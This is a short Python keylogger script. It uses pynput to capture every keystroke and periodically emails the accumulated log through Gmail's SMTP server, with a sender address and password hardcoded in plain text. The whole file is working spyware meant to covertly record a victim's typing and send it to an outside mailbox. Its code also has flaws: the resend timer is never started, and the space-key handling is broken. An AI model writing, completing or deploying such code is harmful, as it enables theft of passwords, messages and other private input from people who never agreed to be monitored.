import pynput.keyboard
import smtplib
import threading

log = ""
def callBack(key):
    global log
    try:
        log = log + str(key.char)
        #log = log.encode() + key.char.encode("utf-8")
    except AttributeError:
        if key == key.space:
            log = log = " "
        else:
            log = log + str(key)
    except:
        pass

    print(log)


def sendEmail(sender, password, text):
    emailServer = smtplib.SMTP("smtp.gmail.com", 587)
    emailServer.starttls()
    emailServer.login(sender, password)
    emailServer.sendmail(sender, sender, text)
    emailServer.quit()


keyloggerListener = pynput.keyboard.Listener(on_press=callBack)


def threadFunc():
    global log
    sendEmail("iriskabels11@gmail.com", "lKabeilSu.11", log.encode("utf-8"))
    log = ""
    timerObj = threading.Timer(30, threadFunc)


with keyloggerListener:
    threadFunc()
    keyloggerListener.join()

